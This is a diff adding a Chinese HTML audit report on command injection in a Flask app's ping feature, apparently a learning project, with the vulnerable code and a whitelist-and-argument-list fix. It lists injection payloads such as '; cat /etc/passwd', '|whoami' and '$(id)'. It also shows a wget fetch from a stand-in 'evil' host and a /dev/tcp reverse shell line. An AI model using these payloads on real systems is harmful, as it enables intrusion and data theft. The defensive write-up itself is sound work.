@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="命令注入漏洞分析与防护实践报告 — 8 个漏洞分析与修复，涵盖分号、管道、逻辑符、反引号等注入方式">
+<meta property="og:title" content="命令注入漏洞分析与防护报告">
+<meta property="og:description" content="Ping网络诊断功能安全审计 — 8个漏洞 + 四层纵深防御 + 49累计修复">
+<title>命令注入漏洞分析与防护报告 | Flask 安全审计</title>
+<link rel="stylesheet" href="css/style.css">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>💀</text></svg>">
+</head>
+<body>
+<nav class="navbar">
+  <a href="../" class="nav-brand"><span class="brand-icon">💀</span> 命令注入审计</a>
+  <button class="nav-toggle">☰</button>
+  <ul class="nav-links">
+    <li><a href="#overview">实验概述</a></li>
+    <li><a href="#vulns">漏洞分析</a></li>
+    <li><a href="#fix">防护方案</a></li>
+    <li><a href="#summary">总结</a></li>
+    <li><a href="../" style="border:1px solid rgba(255,255,255,0.3);">← 返回首页</a></li>
+  </ul>
+</nav>
+<header class="hero">
+  <div class="hero-particles"></div>
+  <div class="hero-badge">命 令 注 入 漏 洞 分 析 报 告</div>
+  <h1>命令注入漏洞分析<br>与防护实践报告</h1>
+  <p class="hero-sub">Flask 用户管理系统 — Ping 网络诊断功能安全审计全记录</p>
+  <div class="hero-divider"></div>
+  <div class="hero-meta">
+    <strong>实验环境：</strong>Kali Linux · Flask 3.1 · subprocess · Burp Suite<br>
+    <strong>目标功能：</strong>Ping 网络诊断 POST /ping &nbsp;|&nbsp; <strong>报告日期：</strong>2026-07-16
+  </div>
+  <div class="hero-scroll">↓ 向下滚动</div>
+</header>
+<main class="container">
+<section id="overview" class="section">
+  <div class="section-header"><h2>一、实验概述</h2><p>Experiment Overview</p></div>
+  <h3>1.1 什么是命令注入？</h3>
+  <p><strong>命令注入</strong>是指攻击者通过在用户输入中嵌入操作系统命令，利用服务端不安全的命令执行方式，让服务端执行攻击者指定的任意系统命令。</p>
+  <div class="arch-box">
+攻击者输入: 127.0.0.1; cat /etc/passwd
+服务端执行: ping -c 3 127.0.0.1; cat /etc/passwd
+                                   └──────────┬──────────┘
+                                        额外执行的恶意命令！
+  </div>
+  <div class="summary-stats">
+    <div class="stat-card stat-danger"><div class="stat-num">8</div><div class="stat-label">发现漏洞</div></div>
+    <div class="stat-card"><div class="stat-num">8</div><div class="stat-label">已修复</div></div>
+    <div class="stat-card stat-danger"><div class="stat-num">6严重</div><div class="stat-label">最高等级</div></div>
+    <div class="stat-card"><div class="stat-num">49</div><div class="stat-label">累计修复</div></div>
+  </div>
+  <h3>1.2 攻击面总览</h3>
+  <div class="arch-box">
+攻击面                          发现    风险
+────────────────────────────────────────────
+分号分隔符注入（; cat /etc/passwd）  1    🔴严重
+管道符注入（| whoami）             1    🔴严重
+逻辑运算符注入（&& id）            1    🔴严重
+反引号注入（`id`）                 1    🔴严重
+$() 子 Shell 注入                 1    🔴严重
+shell=True 执行方式               1    🔴严重
+CSRF 缺失                         1    🔵中危
+错误信息泄露                      1    🟢低危
+────────────────────────────────────────────
+总计                              8  6严重+1中危+1低危
+  </div>
+  <h3>1.3 命令注入的危害路径</h3>
+  <div class="arch-box">
+攻击者控制 ip 参数 → f"ping -c 3 {ip}" → shell=True
+    ├─ 读取文件 /etc/passwd
+    ├─ 写入 Webshell
+    ├─ 安装后门 wget恶意软件
+    └─ 反弹 Shell bash -i >& /dev/tcp/ip/port
+  </div>
+</section>
+<section id="vulns" class="section">
+  <div class="section-header"><h2>二、漏洞分析与修复</h2><p>Vulnerability Analysis &amp; Remediation</p></div>
+  <!-- V1 -->
+  <div class="vuln-card sev-critical">
+    <div class="vuln-header"><span class="vuln-num">1</span><h3>分号分隔符命令注入</h3><span class="tag tag-critical">严重 · CVSS 9.8</span></div>
+    <p><strong>CWE-78 · f-string 拼接 + shell=True</strong></p>
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">Python — 问题代码</span><button class="copy-btn">复制代码</button></div>
+      <pre>cmd = f"ping -c 3 {ip}"          # f-string 拼接
+output = subprocess.check_output(cmd, shell=True)  # shell=True</pre>
+    </div>
+    <p><strong>攻击复现：</strong><code>curl -X POST ... -d "ip=127.0.0.1; cat /etc/passwd"</code> → 读取系统文件。攻击者可执行 <code>; id</code>、<code>; whoami</code>、<code>; wget http://evil/shell.php</code>、<code>; bash -i >& /dev/tcp/ip/port</code> 等任意命令。</p>
+  </div>
+  <!-- V2 -->
+  <div class="vuln-card sev-critical">
+    <div class="vuln-header"><span class="vuln-num">2</span><h3>管道符命令注入</h3><span class="tag tag-critical">严重</span></div>
+    <p><strong>CWE-78 · <code>|</code> 管道符将前命令输出作为后命令输入</strong></p>
+    <pre>curl -X POST ... -d "ip=127.0.0.1|whoami"  # 返回: root</pre>
+  </div>
+  <!-- V3 -->
+  <div class="vuln-card sev-critical">
+    <div class="vuln-header"><span class="vuln-num">3</span><h3>逻辑运算符命令注入</h3><span class="tag tag-critical">严重</span></div>
+    <p><strong><code>&&</code> 前命令成功则执行后命令</strong></p>
+    <pre>curl -X POST ... -d "ip=127.0.0.1&&id"  # 返回: uid=0(root)</pre>
+  </div>
+  <!-- V4 -->
+  <div class="vuln-card sev-critical">
+    <div class="vuln-header"><span class="vuln-num">4</span><h3>反引号命令注入</h3><span class="tag tag-critical">严重</span></div>
+    <p><strong><code>`cmd`</code> 和 <code>$(cmd)</code> 子 Shell 执行</strong></p>
+    <pre>curl -X POST ... -d "ip=127.0.0.1`id`"     # 反引号
+curl -X POST ... -d "ip=127.0.0.1$(id)"   # $() 子Shell</pre>
+  </div>
+  <!-- V5 -->
+  <div class="vuln-card sev-critical">
+    <div class="vuln-header"><span class="vuln-num">5</span><h3>shell=True 命令注入</h3><span class="tag tag-critical">严重</span></div>
+    <p><strong>不安全的 API 调用——字符串被 <code>/bin/sh -c</code> 解析</strong></p>
+    <div class="arch-box">
+subprocess.check_output("ping -c 3 127.0.0.1;id", shell=True)
+                      ↓
+/bin/sh -c "ping -c 3 127.0.0.1;id"
+                      ↓
+Shell 解析：① ping ② ; 分隔符 ③ id 第二条命令 → 两条都执行！
+    </div>
+    <div class="fix-compare">
+      <div class="fix-box fix-before"><span class="fix-label">❌ shell=True</span>字符串经 shell 解析，分隔符变命令边界</div>
+      <div class="fix-box fix-after"><span class="fix-label">✅ 参数列表</span><code>["ping", ip]</code> 不经过 shell，参数被当作普通字符串</div>
+    </div>
+  </div>
+  <!-- V6 -->
+  <div class="vuln-card sev-medium">
+    <div class="vuln-header"><span class="vuln-num">6</span><h3>CSRF 缺失</h3><span class="tag tag-medium">中危</span></div>
+    <p><strong>CWE-352 · Ping 接口无 CSRF Token 校验</strong></p>
+    <p>CSRF + 命令注入 = <strong>远程命令执行</strong>：攻击者构造恶意页面诱导管理员访问 → 浏览器自动提交 POST（附带 Cookie）→ 服务端执行恶意命令。</p>
+  </div>
+  <!-- V7 -->
+  <div class="vuln-card sev-low">
+    <div class="vuln-header"><span class="vuln-num">7</span><h3>错误信息泄露</h3><span class="tag tag-low">低危</span></div>
+    <p><strong>修复前：</strong><code>error = f"执行失败: {e}"</code> 暴露系统细节。</p>
+  </div>
+</section>
+<section id="fix" class="section">
+  <div class="section-header"><h2>三、防护方案</h2><p>Security Hardening</p></div>
+  <h3>3.1 四层纵深防御</h3>
+  <div class="arch-box">
+用户输入 IP 地址
+  ↓ 第1关：CSRF Token 校验 → 403
+  ↓ 第2关：validate_hostname() 白名单
+        只允许 a-zA-Z0-9._- , 长度≤255
+  ↓ 第3关：参数列表模式（无 shell=True）
+        cmd = ["ping", "-c", "3", ip]
+  ↓ 第4关：统一错误提示
+  </div>
+  <h3>3.2 核心修复代码</h3>
+  <div class="code-block">
+    <div class="code-header"><span class="code-lang">Python</span><button class="copy-btn">复制代码</button></div>
+    <pre>def validate_hostname(hostname):
+    if not hostname or len(hostname) > 255: return False
+    allowed = re.match(r"^[a-zA-Z0-9.\-_]+$", hostname)
+    if not allowed: return False
+    if hostname.startswith((".","-")) or hostname.endswith((".","-")): return False
+    return True
+
+@app.route("/ping", methods=["GET", "POST"])
+@login_required
+def ping():
+    if request.method == "POST":
+        if not validate_csrf(): abort(403)
+
+        ip = request.form.get("ip", "").strip()
+        if not ip: error = "请输入 IP 地址"
+        elif not validate_hostname(ip): error = "输入包含非法字符"
+        else:
+            cmd = ["ping", "-c", "3", ip]  # 参数列表！
+            output = subprocess.check_output(cmd, timeout=30)
+            result = output.decode("utf-8", errors="replace")
+    return render_template("ping.html", result=result, error=error)</pre>
+  </div>
+  <h3>3.3 白名单拦截验证</h3>
+  <div class="arch-box">
+127.0.0.1; cat /etc/passwd   → ; 和空格不在白名单 → 拦截
+127.0.0.1|whoami             → | 不在白名单 → 拦截
+127.0.0.1&&id                → & 不在白名单 → 拦截
+127.0.0.1`id`                → ` 不在白名单 → 拦截
+127.0.0.1$(id)               → $() 不在白名单 → 拦截
+127.0.0.1                    ✅ 合法
+8.8.8.8                      ✅ 合法
+localhost                    ✅ 合法
+  </div>
+  <h3>3.4 修复前后对比</h3>
+  <div class="table-wrapper">
+    <table class="compare-table">
+      <thead><tr><th>对比项</th><th>修复前</th><th>修复后</th></tr></thead>
+      <tbody>
+        <tr><td>CSRF 校验</td><td>无</td><td><code>validate_csrf()</code></td></tr>
+        <tr><td>输入校验</td><td>无</td><td><code>validate_hostname()</code></td></tr>
+        <tr><td>命令构建</td><td><code>f"ping -c 3 {ip}"</code></td><td><code>["ping","-c","3",ip]</code></td></tr>
+        <tr><td>执行方式</td><td><code>shell=True</code></td><td><code>shell=False</code>（默认）</td></tr>
+        <tr><td>异常处理</td><td><code>f"执行失败: {e}"</code></td><td>统一提示</td></tr>
+      </tbody>
+    </table>
+  </div>
+  <h3>3.5 四种执行模式对比</h3>
+  <div class="table-wrapper">
+    <table>
+      <thead><tr><th>模式</th><th>代码</th><th>安全</th></tr></thead>
+      <tbody><tr><td><code>os.system()</code></td><td><code>os.system(f"ping {ip}")</code></td><td>❌</td><tr><td><code>subprocess</code> + <code>shell=True</code></td><td><code>check_output(f"ping {ip}", shell=True)</code></td><td>❌</td></tr><tr><td><code>subprocess</code> + 参数列表</td><td><code>check_output(["ping", ip])</code></td><td>✅</td></tr><tr><td>参数列表 + 白名单</td><td><code>check_output(["ping", validate(ip)])</code></td><td>✅✅</td></tr></tbody>
+    </table>
+  </div>
+  <h3>3.6 验证结果</h3>
+  <div class="arch-box">
+1. 正常 Ping 127.0.0.1               ✅ 正常
+2. 分号注入 ;cat /etc/passwd       ✅ 拦截（非法字符）
+3. 管道注入 |whoami                ✅ 拦截（非法字符）
+4. 反引号注入 `id`                 ✅ 拦截（非法字符）
+5. 无 CSRF Token                   ✅ 403
+  </div>
+</section>
+<section id="summary" class="section">
+  <div class="section-header"><h2>四、总结与项目汇总</h2><p>Summary &amp; Project Overview</p></div>
+  <h3>4.1 命令注入防护三条铁律</h3>
+  <div class="arch-box">
+铁律1：永远不要用 shell=True
+铁律2：永远不要用字符串拼接构建命令
+铁律3：如果必须用字符串，先做严格的输入白名单校验
+  </div>
+  <h3>4.2 全部轮次修复统计</h3>
+  <div class="table-wrapper">
+    <table>
+      <thead><tr><th>轮次</th><th>新增功能</th><th>漏洞</th></tr></thead>
+      <tbody>
+        <tr><td>第1轮</td><td>基础登录</td><td>7</td></tr>
+        <tr><td>第2轮</td><td>注册+搜索</td><td>2</td></tr>
+        <tr><td>第3轮</td><td>头像上传</td><td>7</td></tr>
+        <tr><td>第4轮</td><td>个人中心+充值</td><td>8</td></tr>
+        <tr><td>第5轮</td><td>动态页面</td><td>5</td></tr>
+        <tr><td>第6轮</td><td>修改密码</td><td>5</td></tr>
+        <tr><td>第7轮</td><td>URL 抓取(SSRF)</td><td>7</td></tr>
+        <tr><td><strong>第8轮</strong></td><td><strong>Ping 诊断(命令注入)</strong></td><td><strong>8</strong></td></tr>
+        <tr><td><strong>总计</strong></td><td><strong>8个功能</strong></td><td><strong>49</strong></td></tr>
+      </tbody>
+    </table>
+  </div>
+  <h3>4.3 OWASP Top 10 覆盖</h3>
+  <div class="table-wrapper">
+    <table>
+      <thead><tr><th>类别</th><th>漏洞</th><th>状态</th></tr></thead>
+      <tbody>
+        <tr><td>A01: Broken Access Control</td><td>IDOR 越权、未授权</td><td>✅</td></tr>
+        <tr><td>A03: Injection</td><td>SQL注入+命令注入+文件包含</td><td>✅ <strong>12个</strong></td></tr>
+        <tr><td>A04: Insecure Design</td><td>业务逻辑缺陷</td><td>✅</td></tr>
+        <tr><td>A05: Security Misconfiguration</td><td>Debug、Cookie</td><td>✅</td></tr>
+        <tr><td>A07: Identification Failures</td><td>密码明文、CSRF</td><td>✅</td></tr>
+        <tr><td>A08: Data Integrity Failures</td><td>文件上传校验</td><td>✅</td></tr>
+        <tr><td>A10: SSRF</td><td>SSRF</td><td>✅</td></tr>
+      </tbody>
+    </table>
+  </div>
+  <blockquote>
+    <p><strong>"命令注入是所有 Web 漏洞中最'致命'的一种——因为它让攻击者直接操作了操作系统。"</strong></p>
+    <p>从 <code>f"ping -c 3 {ip}"</code> 到安全版本，核心只有两个改变：<code>shell=True</code> → 参数列表模式 + 白名单校验。就是这两个改变，让攻击者从"可以执行任意命令"变成了"只能 ping 一个合法的 IP 地址"。</p>
+  </blockquote>
+</section>
+<section class="section">
+  <div class="section-header"><h2>参考资料</h2><p>References</p></div>
+  <div class="table-wrapper">
+    <table>
+      <thead><tr><th>#</th><th>资料</th><th>来源</th></tr></thead>
+      <tbody>
+        <tr><td>1</td><td>OWASP — Command Injection</td><td><a href="https://owasp.org/www-community/attacks/Command_Injection" target="_blank">owasp.org</a></td></tr>
+        <tr><td>2</td><td>OWASP — OS Command Injection Defense</td><td><a href="https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html" target="_blank">cheatsheetseries.owasp.org</a></td></tr>
+        <tr><td>3</td><td>CWE-78: OS Command Injection</td><td><a href="https://cwe.mitre.org/data/definitions/78.html" target="_blank">cwe.mitre.org</a></td></tr>
+        <tr><td>4</td><td>PortSwigger — Command Injection</td><td><a href="https://portswigger.net/web-security/os-command-injection" target="_blank">portswigger.net</a></td></tr>
+      </tbody>
+    </table>
+  </div>
+</section>
+</main>
+<footer class="footer">
+  <div class="container">
+    <p><strong>报告人：</strong>郭昭阳 &nbsp;|&nbsp; <strong>报告日期：</strong>2026-07-16</p>
+    <p><strong>项目地址：</strong><a href="https://github.com/Zhaoyang-haha/flask-password-security-audit" target="_blank">github.com/Zhaoyang-haha/flask-password-security-audit</a></p>
+    <p style="margin-top:.8rem;font-size:.72rem;color:rgba(255,150,150,.25);">💀 命令注入漏洞分析与防护报告 &copy; 2026</p>
+  </div>
+</footer>
+<button class="back-to-top">↑</button>
+<script src="js/main.js"></script>
+</body>
+</html>
